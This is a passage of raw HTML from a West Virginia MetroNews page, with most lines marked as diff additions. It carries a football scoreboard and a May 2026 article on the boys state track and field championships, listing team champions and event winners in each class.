class="sb-score">19</span> at&nbsp;&nbsp;Herbert Hoover <span class="sb-score">55</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Hedgesville <span class="sb-score">6</span> at&nbsp;&nbsp;John Marshall <span class="sb-score">35</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Petersburg <span class="sb-score">21</span> at&nbsp;&nbsp;Keyser <span class="sb-score">58</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Winfield <span class="sb-score">42</span> at&nbsp;&nbsp;Magoffin Co., Ky.<span class="sb-score">12</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Riverside <span class="sb-score">6</span> at&nbsp;&nbsp;Nitro <span class="sb-score">22</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Fairmont Senior <span class="sb-score">25</span> at&nbsp;&nbsp;North Marion <span class="sb-score">29</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Point Pleasant <span class="sb-score">29</span> at&nbsp;&nbsp;Ripley <span class="sb-score">54</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Preston <span class="sb-score">28</span> at&nbsp;&nbsp;Robert C. Byrd <span class="sb-score">35</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;George Washington <span class="sb-score">49</span> at&nbsp;&nbsp;South Charleston <span class="sb-score">12</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Capital <span class="sb-score">36</span> at&nbsp;&nbsp;St. Albans <span class="sb-score">16</span>&nbsp;&nbsp;</a></li><li class="score-start">&nbsp;&nbsp;&nbsp;</li><li class="score-label">Class AA</li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Smithburg, Md.<span class="sb-score">36</span> at&nbsp;&nbsp;Berkeley Springs <span class="sb-score">20</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Tyler Consolidated <span class="sb-score">44</span> at&nbsp;&nbsp;Buffalo <span class="sb-score">7</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Ravenswood <span class="sb-score">7</span> at&nbsp;&nbsp;Doddridge County <span class="sb-score">45</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;James Monroe <span class="sb-score">18</span> at&nbsp;&nbsp;Liberty Raleigh <span class="sb-score">38</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Nicholas County <span class="sb-score">14</span> at&nbsp;&nbsp;Lincoln <span class="sb-score">32</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Greenbrier East <span class="sb-score">7</span> at&nbsp;&nbsp;Midland Trail <span class="sb-score">15</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Independence <span class="sb-score">21</span> at&nbsp;&nbsp;Mingo Central <span class="sb-score">0</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Bridgeport <span class="sb-score">52</span> at&nbsp;&nbsp;Philip Barbour <span class="sb-score">3</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;South Harrison <span class="sb-score">56</span> at&nbsp;&nbsp;Poca <span class="sb-score">6</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Bluefield <span class="sb-score">34</span> at&nbsp;&nbsp;Ridgeview, Va.<span class="sb-score">2</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Wyoming East <span class="sb-score">16</span> at&nbsp;&nbsp;River View <span class="sb-score">10</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Clay County <span class="sb-score">28</span> at&nbsp;&nbsp;Sissonville <span class="sb-score">35</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Meadow Bridge <span class="sb-score">54</span> at&nbsp;&nbsp;Summers County <span class="sb-score">28</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Oak Glen <span class="sb-score">7</span> at&nbsp;&nbsp;Toronto, Oh.<span class="sb-score">28</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Logan <span class="sb-score">42</span> at&nbsp;&nbsp;Wayne <span class="sb-score">6</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Edison Local, Oh.<span class="sb-score">36</span> at&nbsp;&nbsp;Weir <span class="sb-score">6</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;PikeView <span class="sb-score">14</span> at&nbsp;&nbsp;Westside <span class="sb-score">50</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Roane County <span class="sb-score">9</span> at&nbsp;&nbsp;Williamstown <span class="sb-score">26</span>&nbsp;&nbsp;</a></li><li class="score-start">&nbsp;&nbsp;&nbsp;</li><li class="score-label">Class A</li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Tygarts Valley <span class="sb-score">0</span> at&nbsp;&nbsp;Bath Co. Va.<span class="sb-score">20</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Magnolia <span class="sb-score">36</span> at&nbsp;&nbsp;Bridgeport, Oh.<span class="sb-score">28</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Hannibal - River, Oh.<span class="sb-score">25</span> at&nbsp;&nbsp;Cameron <span class="sb-score">20</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Tucker County <span class="sb-score">22</span> at&nbsp;&nbsp;Clay-Battelle <span class="sb-score">14</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Madonna <span class="sb-score">12</span> at&nbsp;&nbsp;Conotton Valley, Oh.<span class="sb-score">48</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Montcalm <span class="sb-score">6</span> at&nbsp;&nbsp;E. Montgomery, Va.<span class="sb-score">25</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Valley (Wetzel) <span class="sb-score">0</span> at&nbsp;&nbsp;Frontier, Oh. Cougars<span class="sb-score">35</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Moorefield <span class="sb-score">35</span> at&nbsp;&nbsp;Pendleton County <span class="sb-score">34</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Greenbrier West <span class="sb-score">44</span> at&nbsp;&nbsp;Pocahontas County <span class="sb-score">8</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Ritchie County <span class="sb-score">12</span> at&nbsp;&nbsp;St. Marys <span class="sb-score">0</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Tug Valley <span class="sb-score">48</span> at&nbsp;&nbsp;Tolsia <span class="sb-score">45</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Wheeling Central <span class="sb-score">13</span> at&nbsp;&nbsp;Union Local, Oh.<span class="sb-score">24</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Calhoun County  at&nbsp;&nbsp;Van &nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Wahama <span class="sb-score">62</span> at&nbsp;&nbsp;Webster County <span class="sb-score">0</span>&nbsp;&nbsp;</a></li><li><a href="https://wvmetronews.com/high-school-football-scores/">&nbsp;Gilmer County <span class="sb-score">14</span> at&nbsp;&nbsp;Wirt County <span class="sb-score">13</span>&nbsp;&nbsp;</a></li>                    </ul>
+                </div>
+            </div>
+            <div class="sb">
+            </div>
+        </div>
+
+    
+
+
+
+</div>
+<div id="livebanner">
+    
+<div class="header-live">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+
+<div class="header-live-item"><span class="fa-stack"><i class="fas fa-circle fa-stack-2x"></i><i class="fas fa-play fa-stack-1x fa-inverse"></i></span>High School Game Night with Fred Persinger & Dave Jecklin&nbsp; <a href="https://www.wvmetronewstv.com/browse/ " onclick="if (!window.__cfRLUnblockHandlers) return false; " target='_blank' data-cf-modified-d157fd38a32685cc840424ab-="">Watch</a>&nbsp;|&nbsp; <a href=" https://player.amperwave.net/15402" onclick="if (!window.__cfRLUnblockHandlers) return false; " data-cf-modified-d157fd38a32685cc840424ab-="">Listen</a></div>
+            </div>
+        </div>
+    </div>
+</div>
+</div>
+
+<div class="hfeed site" id="page">
+
+                                
+        <header id="page-head">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+                        <div id="head-menu">
+                            <i class="fas fa-bars" id="nav-toggle"></i>
+                        </div>
+                        <a href="/"><img src="/wp-content/themes/wvmn/img/metronews-logo-2.png" id="head-logo"/></a>
+                        <div class="header-links">
+
+                            <div class="header-link">
+                                <span class="fa-stack">
+                                  <i class="fas fa-circle fa-stack-2x"></i>
+                                  <i class="fas fa-play fa-stack-1x fa-inverse"></i>
+                                </span>
+                                <a href="javascript:openLatestPlayer('/wp-content/themes/wvmn/includes/latestnewsplayer.php')">Current News</a>
+                            </div>
+                            <div class="header-link">
+                                <span class="fa-stack">
+                                  <i class="fas fa-circle fa-stack-2x"></i>
+                                  <i class="fas fa-play fa-stack-1x fa-inverse"></i>
+                                </span>
+                                <a href="javascript:openLatestPlayer('/wp-content/themes/wvmn/includes/latestsportsplayer.php?cache-control=null')">Current Sports</a>
+                            </div>
+                            <div class="header-link" >
+                                <span class="fa-stack">
+                                  <i class="fas fa-circle fa-stack-2x"></i>
+                                  <i class="fas fa-search fa-stack-1x fa-inverse"></i>
+                                </span>
+                                <a href="#" target="_blank" id="searchOpen">Search</a>
+                            </div>
+                            <div class="header-sublinks">
+                                <a href="/about-metronews">About Us</a> &nbsp;&nbsp; | &nbsp;&nbsp;
+                                <a href="/our-people">Our People</a> &nbsp;&nbsp; | &nbsp;&nbsp;
+                                <a href="/affiliates">Affiliates</a> &nbsp;&nbsp; | &nbsp;&nbsp;
+                                <a href="/advertising">Advertise</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="mn-search" id="mn-search">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-sm-12">
+                            <form method="get" class="search-form" id="searchform" action="/">
+                                <input type="text" value="" name="s" id="s" placeholder="Search WV MetroNews..." /><i class="far fa-chevron-circle-right" id="searchExec"></i><i class="far fa-times-circle" id="searchClose"></i>
+                            </form>
+                            <script type="d157fd38a32685cc840424ab-text/javascript">
+                                jQuery(document).ready(function($) {
+                                    $('#searchOpen').click(function() {
+                                        $('#mn-search').addClass('open');
+                                        return false;
+                                    });
+                                    $('#searchClose').click(function() {
+                                        $('#mn-search').removeClass('open');
+                                    });
+                                    $('#searchExec').click(function() {
+                                        $('#searchform').submit();
+                                    });
+                                    $('#searchClose, #searchExec').hover(
+                                        function() { $(this).addClass('fas'); },
+                                        function() { $(this).removeClass('fas'); }
+                                    );
+                                });
+                            </script>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <div id="main-nav">
+            <div class="container">
+                <div class="row">
+                    <div class="col-sm-12">
+                        <nav>
+                            <!-- The WordPress Menu goes here -->
+                            <ul id="menu-primary-menu" class=""><li id="menu-item-372823" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-372823"><a href="/">Home</a></li>
+<li id="menu-item-460802" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-460802"><a href="https://wvmetronews.com/news/">News</a></li>
+<li id="menu-item-587251" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-587251"><a href="https://wvmetronews.com/sports">Sports</a>
+<ul class="sub-menu">
+	<li id="menu-item-374313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-374313"><a href="https://wvmetronews.com/sports/wvu-sports/">WVU Sports</a></li>
+	<li id="menu-item-479155" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-479155"><a href="https://wvmetronews.com/sports/high-school-sports/">High School Sports</a></li>
+	<li id="menu-item-374314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-374314"><a href="https://wvmetronews.com/sports/marshall-sports/">Marshall Sports</a></li>
+</ul>
+</li>
+<li id="menu-item-497525" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-497525"><a href="https://wvmetronews.com/outdoors/?1234">Outdoors</a></li>
+<li id="menu-item-157881" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-157881"><a href="https://wvmetronews.com/podcast/">Podcasts</a>
+<ul class="sub-menu">
+	<li id="menu-item-374287" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-374287"><a href="/podcast/metronews-this-morning">MetroNews This Morning</a></li>
+	<li id="menu-item-374282" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-374282"><a href="/podcast/talkline">MetroNews Talkline</a></li>
+	<li id="menu-item-616071" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-616071"><a href="https://wvmetronews.com/podcast/midday/">MetroNews Midday</a></li>
+	<li id="menu-item-374285" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-374285"><a href="/podcast/hotline">MetroNews Hotline</a></li>
+	<li id="menu-item-374283" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-374283"><a href="/podcast/sportsline">MetroNews Sportsline</a></li>
+	<li id="menu-item-374288" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-374288"><a href="/podcast/3-guys-before-the-game">3 Guys Before the Game</a></li>
+	<li id="menu-item-374286" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-374286"><a href="/podcast/west-virginia-outdoors">West Virginia Outdoors</a></li>
+	<li id="menu-item-673744" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-673744"><a href="/podcast/stateofminds">State of Minds</a></li>
+	<li id="menu-item-498886" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-498886"><a href="https://wvmetronews.com/capitol-report/">Capitol Report</a></li>
+	<li id="menu-item-374284" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-374284"><a href="/podcast/high-school-sportsline">High School Sportsline</a></li>
+	<li id="menu-item-442062" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-442062"><a href="https://wvmetronews.com/podcast/roundup/">High School Basketball Roundup</a></li>
+	<li id="menu-item-384509" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-384509"><a href="https://wvmetronews.com/podcast/high-school-game-night/">High School Game Night</a></li>
+</ul>
+</li>
+<li id="menu-item-558907" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-558907"><a target="_blank" rel="noopener" href="https://www.wvmetronewstv.com/"><img src="https://s3.us-east-005.backblazeb2.com/wvmn-s3/2024/03/mntv-white.png" alt="WV Metro News TV"><span class="hidden">WV Metronews Television</span></a></li>
+</ul>                                    <a style='padding:0;margin:0;color:unset;' href='/weather'><div class="header-weather"><div id="owm-weather-id-458947-1" class="owm-weather-id" data-id="458947" data-geo_location="true" data-weather_id=owm-weather-id-458947-1></div></a>
+        </div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    
+
+    
+            <section id="main-nav-ad">
+            <div class="container" data="load-if-not-hsf-fr">
+                <div class="row">
+                    <div class="col-sm text-center">
+                        <div align="center" data-freestar-ad="__320x100 __970x90" id="wvmetronews_leaderboard_atf"> <script data-cfasync="false" type="text/javascript"> freestar.config.enabled_slots.push({placementName: "wvmetronews_leaderboard_atf", slotId: "wvmetronews_leaderboard_atf"}); </script></div>                    </div>
+                </div>
+            </div>
+        </section>
+
+    <script type="d157fd38a32685cc840424ab-text/javascript">
+var freestar = freestar || {};
+freestar.queue = freestar.queue || [];
+freestar.queue.push(function(){
+googletag.pubads().addEventListener("slotRenderEnded", (event) => {
+if(event.campaignId === 2834117189) {
+freestar.queue.push(function() {  
+freestar.deleteStickyFooter(event.slot.getSlotElementId());  
+});
+}     
+ });   
+});
+</script>
+<div id="page-body">
+    <div class="container">
+        <main class="layout-2-column-flex">
+            <section>
+                
+                    
+<article class="post-671539 post type-post status-publish format-standard has-post-thumbnail hentry category-high-school-sports category-sports" id="post-671539">
+
+    <img src="https://s3.us-east-005.backblazeb2.com/wvmn-s3/2026/05/0F4A6842.jpg" style="display:none;">
+        <header class="entry-header">
+        <div class="section-title">
+            <a href="/category/sports">Sports</a>
+        </div>
+        <h1 class="entry-title">Boys State Track: Huntington &#038; Morgantown share Class AAAA title; Doddridge defends in Class AA</h1>        <div class="entry-meta">
+            <div class="a2a_kit a2a_kit_size_32 a2a_default_style" style="float:right;zoom:0.8;padding-top:4px;">
+                <a class="a2a_button_facebook"></a>
+                <a class="a2a_button_twitter"></a>
+                <a class="a2a_button_email"></a>
+                <a class="a2a_button_sms"></a>
+            </div>
+            <div class="byline"> By <span class="author vcard"><a class="url fn n" href="https://wvmetronews.com/author/jbrocato/">Joe Brocato</a></span>&nbsp;</div><div class="posted-on"><time class="entry-date published updated" datetime="2026-05-23T20:21:51-04:00">May 23, 2026 - 8:21 pm</time></div>        </div><!-- .entry-meta -->
+    </header><!-- .entry-header -->
+
+    
+    <div class="entry-content">
+        <div style="padding: 56.25% 0 0 0; position: relative;"><iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" title="Boys State Track: Huntington &amp; Morgantown share Class AAAA title; Doddridge defends in Class AA" src="https://player.vimeo.com/video/1195054106?badge=0&amp;autopause=0&amp;player_id=0&amp;app_id=58479" frameborder="0"></iframe></div>
+<p><script src="https://player.vimeo.com/api/player.js" type="d157fd38a32685cc840424ab-text/javascript"></script></p>
+<p><a href="https://live.mountaintiming.com/meets/74030/events/individual/2770901">Full event results</a></p>
+<p><strong>CHARLESTON, W.Va.</strong> &#8212; In the first four-class Boys Track &amp; Field State Championship, Doddridge County owned the largest margin of victory. Last year&#8217;s Class AA state champions defended their title with ease, scoring 142 points. The Bulldogs won a pair of events on Day 2. Tommy Walters-Hickman won the long jump title. And in what is traditionally one of their strongest events, DoCo went 1-2-3 in the pole vault. Trey McDonough, Tristan Swiger and Nathanael Lloyd combined to give the Bulldogs 24 points. The state title is the 13th in program history.</p>
+<p>Independence surged on Saturday to finish as the Class AA runner-up. Christian Linksweiler won both hurdle events in the 300 hurdles and 110 hurdles while Carson Treadway won the high jump. The Patriots also won the 4&#215;100 meter relay.</p>
+<p>Sissonville&#8217;s Connor Pritt won all three of his events on Saturday. He took home titles in the 100 meter run, the 200 meter run and the 400 meter run.</p>
+<p>Amos Kimble of Tyler Consolidated added Saturday wins in the 1600 meter run and the 800 meter run to his two-mile victory from Friday night.</p>
+<p>And Frankfort won the 4&#215;200 meter and 4&#215;400 meter relays.</p>
+<p>Wahama earned the second state title for the Little Kanawha Conference by taking the Class A crown. The White Falcons finished with 123.5 points. On Saturday, Wahama took home a trio of event victories. Reezin Stitt won the long jump, Charlie Long won the shot put and Trace Simpkins crossed the line first in the 300 meter hurdles.</p>
+<p>Ritchie County finished as the runners-up. East Hardy finished in third place and they won three races on Saturday. Evan Hamilton won the 100 meter run. Mason Hamilton crossed the line first in the 200 meter run and the Cougars won the 4&#215;100 meter relay.</p>
+<p>Charleston&#8217;s Catholic Peter Basdekis was a double winner on Saturday. He took home the titles in the 1,600 meter run and the 800 meter run. Other event winners on Day 2 are Wirt County&#8217;s Tyler Smith in the 400 meter run, Greenbrier West&#8217;s Colton Dunbar in the 110 meter hurdles and St. Marys won the 4&#215;200 and 4&#215;400 meter relays.</p>
+<p>Last year&#8217;s Class AA state champions from Point Pleasant leveled up to win the Class AAA title and the program&#8217;s fifth championship. The Big Blacks won three events on Day 2. Caden Hill was first up as he won the discus. Cohen McDaniel won the pole vault and the Big Blacks also finished second and fourth in the event to account for 23 points towards their team total. And Evan Bailes finished off the day for Point by winning the 110 hurdles.</p>
+<p>Bridgeport surged late in the competition to earn runner-up honors. The Indians won two events on the final day. William George won the 200 meter run and the Indians also won the 4&#215;200 meter relay.</p>
+<p>Greenbrier East won a pair of events by claiming victory in the 4&#215;100 meter relay and Aiden Denning won the 300 hurdles.</p>
+<p>Other event winners on Day 2 included Princeton&#8217;s Jacob Hall in the 400 meter run, Capital&#8217;s Damian Johnson in the 100 meter run, Trevor George of Elkins in the 800 meter run, Herbert Hoover&#8217;s Maddox White in the high jump, Winfield in the 4&#215;400 meter relay and Keyser&#8217;s Luca Altobello earned his second individual win of the meet by taking the 1600 meter title.</p>
+<p>The first-ever Class AAAA state championship will be shared. Coming down to the 18th and final event, the 4&#215;400 meter relay, Morgantown led Huntington by two points at the top. The Highlanders finished second while the Mohigans were third and the teams tied with 107 points.</p>
+<p>Huntington earned victories in the 4&#215;100 meter relay and with Carter Geveke in the 300 meter hurdles on Saturday while Morgantown took home titles in the 1600 meter run with Joaquin Summers and Benjamin Funk won the 100 meter run. University finished third in the meet. The Hawks picked up victories in the 400 meter run and the 110 meter hurdles with Keion Arnold and KK Lewis winning, respectively.</p>
+<p>Parkersburg earned two victories on Saturday behind their 4&#215;400 meter relay team and Drey Ginter taking the shot put title. Martinsburg also won two events with their 4&#215;200 meter relay team and Jhaylin Lansdowne winning the 200 meter run.</p>
+<p>Other event winners in Class AAAA on Day 2 are Woodrow Wilson&#8217;s Vance Lindley in the 800 meter run and Washington&#8217;s Maurice Charles in the discus.</p>
+    </div><!-- .entry-content -->
+
+
+
+    <footer class="entry-footer">
+
+        
+    </footer><!-- .entry-footer -->
+
+</article><!-- #post-## -->
+
+                    <br/><br/>
+                    <div class="sharethis-inline-share-buttons"></div>
+            <div class="row">
+                <div class="col-sm-12 text-center">
+                    <!-- Tag ID: wvmetronews_article_btf -->
+<div align="center" data-freestar-ad="__336x280 __728x90" id="wvmetronews_article_btf">
+  <script data-cfasync="false" type="text/javascript">
+    freestar.config.enabled_slots.push({ placementName: "wvmetronews_article_btf", slotId: "wvmetronews_article_btf" });
+  </script>
+</div>                </div>
+            </div>
+                    <!-- what dis? -->
+                    
+                <br/><br/>
+                    <div class="category-group-article-list">
+<h4 class="group-title">More Sports</h4>
+<a href="https://wvmetronews.com/2026/09/18/elliotts-perseverance-leadership-critical-in-helping-lead-turnaround-at-virginia/" class="article-link">
+<div class="category">Sports</div>
+<div class="photo" style="background-image:url(https://s3.us-east-005.backblazeb2.com/wvmn-s3/2026/09/2026-08-29T233747Z_276511290_MT1USATODAY29694137_RTRMADP_3_NCAA-FOOTBALL-NORTH-CAROLINA-STATE-AT-VIRGINIA-490x327.jpg);"><div class="photo-inner"></div></div>
+<div class="content">
+<div class="headline">Elliott's perseverance, leadership critical in helping lead turnaround at Virginia</div>
+<div class="excerpt">In his fifth season as head coach of the Cavaliers, Tony Elliott has led the program to unprecedented success of late. Now comes a matchup with West Virginia, and Elliott has an extensive past with Mountaineers' head coach Rich Rodriguez and defensive coordinator Zac Alley. </div>
+<div class="byline">By Greg Carey</div>
+<div class="date">September 18, 2026 - 4:23 pm</div>
+</div>
+</a>
+<a href="https://wvmetronews.com/2026/09/18/woods-expects-angry-bunch-of-herd-in-matchup-at-missouri-state/" class="article-link">
+<div class="category">Sports</div>
+<div class="photo" style="background-image:url(https://s3.us-east-005.backblazeb2.com/wvmn-s3/2026/09/2026-09-10T092255Z_1363165030_MT1USATODAY29778270_RTRMADP_3_NCAA-FOOTBALL-MISSOURI-STATE-AT-TEXAS-A-AMP-M-490x327.jpg);"><div class="photo-inner"></div></div>
+<div class="content">
+<div class="headline">Woods expects 'angry bunch' of Herd in Missouri State's matchup with Marshall</div>
+<div class="excerpt">The Bears prevailed by one point in Huntington last season, and although much has changed for both teams since, first-year Missouri State head coach Casey Woods doesn't believe Marshall has forgotten. </div>
+<div class="byline">By MetroNews Staff</div>
+<div class="date">September 18, 2026 - 4:15 pm</div>
+</div>
+</a>
+<a href="https://wvmetronews.com/2026/09/18/class-a-week-4-pendleton-hosts-moorefield-in-matchup-of-one-loss-teams/" class="article-link">
+<div class="category">Sports</div>
+<div class="photo" style="background-image:url(https://s3.us-east-005.backblazeb2.com/wvmn-s3/2026/09/A-4-still-490x327.jpg);"><div class="photo-inner"></div></div>
+<div class="content">
+<div class="headline">Class A Week 4: Pendleton hosts Moorefield in matchup of one-loss teams</div>
+<div class="excerpt">The Wildcats fell by a point to East Hardy in Week 2.</div>
+<div class="byline">By Joe Brocato</div>
+<div class="date">September 18, 2026 - 10:59 am</div>
+</div>
+</a>
+<a href="https://wvmetronews.com/2026/09/18/photo-gallery-ritchie-shuts-out-st-marys-to-pick-up-first-victory/" class="article-link">
+<div class="category">Sports</div>
+<div class="photo" style="background-image:url(https://s3.us-east-005.backblazeb2.com/wvmn-s3/2026/09/Ritchie-vs-St-Marys-21-490x327.jpg);"><div class="photo-inner"></div></div>
+<div class="content">
+<div class="headline">Photo gallery: Ritchie shuts out St. Marys to pick up first victory</div>
+<div class="excerpt"></div>
+<div class="byline">By MetroNews Staff</div>
+<div class="date">September 18, 2026 - 12:33 am</div>
+</div>
+</a>
+</div>
+
+                    
+                
+
+
+            </section>
+            <section>
+                <aside id="wvmn_widget_livestream-3" class="widget widget_wvmn_widget_livestream"><div class="livestream-sidebar"><div class="livestream-title"><i class="fas fa-volume"></i> High School Game Night with Fred Persinger & Dave Jecklin</div><a href="https://www.wvmetronewstv.com/browse/ " target="_blank" style="color:#f2f2f2"> Watch Live on<img src="/wp-content/uploads/2024/03/mntv-white.png" alt="WV MetroNews TV"/></a></div></aside><aside id="block-5" class="widget widget_block"><div align="center" data-freestar-ad="__336x280 __300x250" id="wvmetronews_medrec_1"> <script data-cfasync="false" type="text/javascript"> freestar.config.enabled_slots.push({placementName: "wvmetronews_medrec_1", slotId: "wvmetronews_medrec_1"}); </script></div></aside><aside id="block-7" class="widget widget_block"><div align="center" data-freestar-ad="__336x280 __300x250" id="wvmetronews_medrec_3"> <script data-cfasync="false" type="text/javascript"> freestar.config.enabled_slots.push({placementName: "wvmetronews_medrec_3", slotId: "wvmetronews_medrec_3"}); </script></div></aside><aside id="wvmn_widget_img_link-15" class="widget widget_wvmn_widget_img_link"><a href="https://wvrc.incentrev.com/" target="_blank"><img src="https://s3.us-east-005.backblazeb2.com/wvmn-s3/2026/05/v3-halfoff-300x100-1.jpg" alt=""></a></aside><aside id="wvmn_widget_hc-5" class="widget widget_wvmn_widget_hc"><div class="hoppy"><div class="hoppy-header"><a href="/category/hoppys-commentary/">View All</a>Hoppy's Commentary</div><div class="hoppy-inner"><a href="https://wvmetronews.com/2026/09/17/west-virginias-mixed-report-on-poverty/"><div class="date">September 17, 2026</div><div class="headline">West Virginia's Mixed Report on Poverty</div></a><a href="https://wvmetronews.com/2026/09/10/remembering-9-11/"><div class="date">September 10, 2026</div><div class="headline">Remembering 9/11</div></a><a href="https://wvmetronews.com/2026/09/03/crafting-the-2026-wvu-football-season-narrative/"><div class="date">September 3, 2026</div><div class="headline">Crafting the 2026 WVU Football Season Narrative</div></a><a href="https://wvmetronews.com/2026/08/27/681932/"><div class="date">August 27, 2026</div><div class="headline">West Virginia Remains Trump Country, But He is Losing Support Among Independents</div></a></div></div></aside><aside id="wvmn_widget_mnc-2" class="widget widget_wvmn_widget_mnc"><div class="hoppy"><div class="hoppy-header"><a href="/category/metronews-commentary/">View All</a>Metronews Commentary</div><div class="hoppy-inner"><a href="https://wvmetronews.com/2026/09/17/jobs-can-fix-a-lot-including-bad-stats/"><div class="date">September 17, 2026</div><div class="headline">Jobs Can Fix a Lot, Including Bad Stats</div><div class="author">By TJ Meadows</div></a><a href="https://wvmetronews.com/2026/09/17/west-virginias-mixed-report-on-poverty/"><div class="date">September 17, 2026</div><div class="headline">West Virginia's Mixed Report on Poverty</div><div class="author">By Hoppy Kercheval</div></a><a href="https://wvmetronews.com/2026/09/15/48-of-123-stat-is-chilling-action-is-prudent/"><div class="date">September 15, 2026</div><div class="headline">'48 of 123' Stat is Chilling; Action is Prudent</div><div class="author">By TJ Meadows</div></a></div></div></aside>            </section>
+        </main>
+    </div>
+</div>
+
+
+
+
+
+
+    <div class="gray-bg ad-banner-footer">
+        <div class="container">
+            <div class="row">
+                <div class="col-sm-12 text-center">
+                    <div align="center" data-freestar-ad="__320x100 __970x90" id="wvmetronews_leaderboard_btf"> <script data-cfasync="false" type="text/javascript"> freestar.config.enabled_slots.push({placementName: "wvmetronews_leaderboard_btf", slotId: "wvmetronews_leaderboard_btf"}); </script></div>                </div>
+            </div>
+        </div>
+    </div>
+    
+<footer id="page-foot">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6">
+                <p><a href="/"><img src="https://wvmetronews.com/wp-content/themes/wvmn/img/metronews-logo-2-inverse.png" id="foot-logo" /></a></p>
+                <table>
+                    <tr><td valign="top"><i class="fas fa-mobile-alt fa-fw"></i></td>
+                        <td valign="top"><a href="tel:13043467055">304-346-7055</a></td>
+                        <td valign="top" rowspan="2">
